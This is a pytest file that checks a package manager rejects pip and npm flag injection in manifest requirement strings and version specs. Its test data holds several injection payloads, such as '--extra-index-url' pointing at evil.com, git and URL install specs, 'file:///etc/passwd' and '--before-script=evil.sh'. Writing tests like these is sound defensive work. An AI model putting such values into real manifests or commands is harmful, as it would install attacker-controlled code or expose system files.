"""Tests for v9.3.0 Phase 6 — command injection hardening.

Each test demonstrates a flag-injection vector that *was* exploitable before
the hardening (a malicious manifest/lockfile could smuggle pip/npm flags via
the requirement string or version spec) and proves it is now refused.
"""

from __future__ import annotations

import sys
from pathlib import Path
from unittest import mock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from epl.package_manager import (
    _normalize_python_requirement,
    _validate_npm_version_spec,
)


# ── _normalize_python_requirement (pip flag injection) ─────────────────────


class TestPipFlagInjection:
    def test_accepts_clean_version_pin(self):
        assert _normalize_python_requirement('requests', '2.28.0') == '2.28.0'

    def test_accepts_clean_specifier(self):
        assert _normalize_python_requirement('requests', '>=2.0') == '>=2.0'

    def test_accepts_star(self):
        assert _normalize_python_requirement('requests', '*') == 'requests'

    def test_accepts_none(self):
        assert _normalize_python_requirement('requests', None) == 'requests'

    @pytest.mark.parametrize('payload', [
        '--extra-index-url https://evil.com/pypi',
        '-r /tmp/evil.txt',
        '--upgrade',
        'requests --upgrade',
        'requests -U',
        '   --pre',
    ])
    def test_rejects_flag_injection(self, payload):
        with pytest.raises(ValueError, match='must not contain flags'):
            _normalize_python_requirement('requests', payload)

    @pytest.mark.parametrize('payload', [
        'requests @ https://evil.com/pkg.whl',
        'requests @ git+https://evil.com/repo',
        'requests @ file:///etc/passwd',
    ])
    def test_rejects_url_install_specs(self, payload):
        with pytest.raises(ValueError, match='URL/path install specs'):
            _normalize_python_requirement('requests', payload)


# ── _validate_npm_version_spec (npm flag injection) ────────────────────────


class TestNpmFlagInjection:
    def test_accepts_clean_semver(self):
        assert _validate_npm_version_spec('^1.2.3') == '^1.2.3'

    def test_accepts_exact_version(self):
        assert _validate_npm_version_spec('1.0.0') == '1.0.0'

    def test_accepts_star(self):
        assert _validate_npm_version_spec('*') == '*'

    def test_accepts_none(self):
        assert _validate_npm_version_spec(None) is None

    def test_accepts_empty(self):
        assert _validate_npm_version_spec('') == ''

    @pytest.mark.parametrize('payload', [
        '--before-script=evil.sh',
        '-g',
        '* --foo',
        '1.0.0 --save-dev',
        '   --production',
    ])
    def test_rejects_flag_injection(self, payload):
        with pytest.raises(ValueError, match='must not contain flags'):
            _validate_npm_version_spec(payload)

    def test_rejects_non_string(self):
        with pytest.raises(ValueError, match='must be a string'):
            _validate_npm_version_spec(123)


# ── End-to-end: a poisoned manifest cannot reach pip/npm with flags ────────


class TestEndToEndPipManifest:
    """Verify the install_python_dependencies pathway refuses a poisoned manifest.

    Before hardening: a manifest entry `evil = "--extra-index-url https://evil"`
    would expand to `pip install --extra-index-url https://evil`. Now it raises
    at the boundary and the subprocess is never invoked.
    """

    def test_poisoned_manifest_does_not_invoke_pip(self, tmp_path):
        import tempfile
        from epl import package_manager

        manifest_dir = tmp_path / 'proj'
        manifest_dir.mkdir()
        (manifest_dir / 'epl.toml').write_text(
            '[project]\nname = "x"\nversion = "0.1.0"\n'
            '[python-dependencies]\nevil = "--extra-index-url https://evil.com"\n'
        )

        with mock.patch.object(package_manager.subprocess, 'check_call') as pip:
            ok = package_manager.install_python_dependencies(str(manifest_dir))

        # Poisoned entry refused; pip was never called.
        assert ok is False
        pip.assert_not_called()


class TestEndToEndNpmManifest:
    def test_poisoned_npm_version_refused(self):
        from epl import package_manager

        # install_js_package validates at the entrypoint; mock npm so test stays hermetic.
        with mock.patch.object(package_manager.shutil, 'which', return_value='/usr/bin/npm'), \
             mock.patch.object(package_manager.subprocess, 'check_call') as npm:
            ok = package_manager.install_js_package(
                'axios', version='--before-script=evil', save=False
            )

        assert ok is False
        npm.assert_not_called()
